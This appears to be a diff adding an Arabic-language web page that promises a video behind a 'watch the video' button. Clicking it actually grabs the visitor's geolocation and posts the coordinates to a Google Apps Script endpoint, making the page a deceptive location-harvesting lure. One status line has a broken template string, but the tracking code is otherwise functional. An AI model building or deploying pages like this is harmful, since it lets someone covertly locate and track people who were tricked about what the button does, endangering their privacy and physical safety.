@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>اضغط على الزر لمشاهدة الفيديو</title>
+</head>
+<body>
+  <h1>اضغط على الزر لمشاهدة الفيديو</h1>
+  <button onclick="getLocation()">شاهد الفيديو</button>
+  <p id="status"></p>
+
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    document.getElementById('status').innerHTML = "جارٍ تحديد موقعك...";
+    navigator.geolocation.getCurrentPosition(sendLocation, showError);
+  } else {
+    document.getElementById('status').innerHTML = "المتصفح لا يدعم تتبع الموقع.";
+  }
+}
+
+function sendLocation(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  document.getElementById('status').innerHTML = تم تحديد موقعك بنجاح: ${latitude}, ${longitude};
+
+  fetch('https://script.google.com/macros/s/AKfycbyiffkDghdCTP6Dl4zJwj1SRILOVO1vPNjMcCXybZadYFc0C54JZmU1qzHKvka4E-pt/exec', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      latitude: latitude,
+      longitude: longitude
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('تم إرسال الموقع بنجاح:', data);
+    alert('تم إرسال موقعك بنجاح ✅');
+  })
+  .catch(error => {
+    console.error('حدث خطأ أثناء الإرسال:', error);
+    alert('حدث خطأ أثناء إرسال الموقع.');
+  });
+}
+
+function showError(error) {
+  document.getElementById('status').innerHTML = "لم يتم تحديد الموقع: " + error.message;
+}
+</script>
+</body>
+</html>
